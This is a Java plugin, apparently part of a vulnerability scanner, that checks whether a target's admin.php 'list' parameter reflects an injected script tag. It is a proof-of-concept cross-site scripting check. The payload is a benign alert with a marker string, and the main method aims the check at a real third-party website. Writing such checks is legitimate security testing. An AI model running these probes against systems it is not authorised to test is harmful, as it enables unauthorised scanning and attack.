package cn.com.sgcc.marki_with_maven.modules;

import java.io.IOException;
import java.net.URLEncoder;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;

import org.apache.http.HttpStatus;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.util.EntityUtils;

import cn.com.sgcc.marki_with_maven.misc.NetWorkTools;

public class MG2_list_Parameter_xss implements IPocBase {

	@Override
	public Map info() {
		// TODO Auto-generated method stub
		Map info = new HashMap<String, Object>();
		info.put("name", "MG2_list_Parameter_xss");
		return info;
	}

	@Override
	public boolean match(Map infodict) {
		// TODO Auto-generated method stub
		boolean ismatch = false;
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		CloseableHttpClient customClient = null;
		try {
			String url = String.format("%s://%s:%s/admin.php", serviceType.contains("https") ? "https":"http", ip, port );
			HttpGet httpGet = new HttpGet(url);
			customClient = new NetWorkTools().getCustomClient();
			CloseableHttpResponse resp = customClient.execute(httpGet);
			if ( resp.getStatusLine().getStatusCode() == HttpStatus.SC_OK )
			{
				ismatch = true;
			}
			httpGet.releaseConnection();
		} catch (KeyManagementException | NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		finally
		{
			try {
				if(customClient != null)
					customClient.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return ismatch;
	}

	@Override
	public boolean verify(Map infodict) {
		// TODO Auto-generated method stub
		boolean ismatch = false;
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		CloseableHttpClient customClient = null;
		try {
			String url = String.format("%s://%s:%s/admin.php?action=import&list=", serviceType.contains("https") ? "https":"http", ip, port );
			url = url + URLEncoder.encode("\"><script>alert(e165421110ba03099a1c0393373c5b43);</script>");
			HttpGet httpGet = new HttpGet(url);
			customClient = new NetWorkTools().getCustomClient();
			CloseableHttpResponse resp = customClient.execute(httpGet);
			String string = EntityUtils.toString(resp.getEntity());
			if ( resp.getStatusLine().getStatusCode() == HttpStatus.SC_OK && string.contains("e165421110ba03099a1c0393373c5b43"))
			{
				ismatch = true;
			}
			httpGet.releaseConnection();
		} catch (KeyManagementException | NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		finally
		{
			try {
				if(customClient != null)
					customClient.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return ismatch;
	}
	
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		Map infodict = new HashMap<String, String>();
		infodict.put("ip", "www.baidu.com");
		infodict.put("port", "80");
		infodict.put("service_type", "http");
		infodict.put("service_version", "topsec");
		MG2_list_Parameter_xss mg2_list_Parameter_xss = new MG2_list_Parameter_xss();
		mg2_list_Parameter_xss.match(infodict);
		System.out.println(mg2_list_Parameter_xss.verify(infodict));
	}

}
